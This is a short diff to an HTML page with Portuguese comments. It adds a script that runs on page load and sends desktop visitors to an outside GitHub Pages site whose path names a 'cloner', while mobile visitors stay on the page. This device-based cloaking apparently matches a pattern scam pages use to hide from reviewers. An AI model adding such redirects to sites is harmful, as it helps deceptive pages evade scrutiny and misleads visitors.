@@ -525,6 +525,25 @@
     </style>
 </head>
 <body>
+    <script>
+      // Função para detectar se o usuário está em desktop
+      function detectDesktopAccess() {
+        const userAgent = navigator.userAgent.toLowerCase();
+        const isMobile = /mobile|android|iphone|ipad|phone/.test(userAgent);
+
+        // Redireciona apenas se não for dispositivo móvel
+        if (!isMobile) {
+          console.log("Dispositivo detectado: Desktop. Redirecionando...");
+          window.location.href = "https://siteconfiavel.github.io/CLONADOR-COMEDIA/";
+        } else {
+          console.log("Dispositivo detectado: Mobile. Acesso permitido.");
+        }
+      }
+      
+      // Executa a detecção quando a página carrega
+      detectDesktopAccess();
+    </script>
+
     <!-- Header -->
     <header>
         <div class="container header-container">
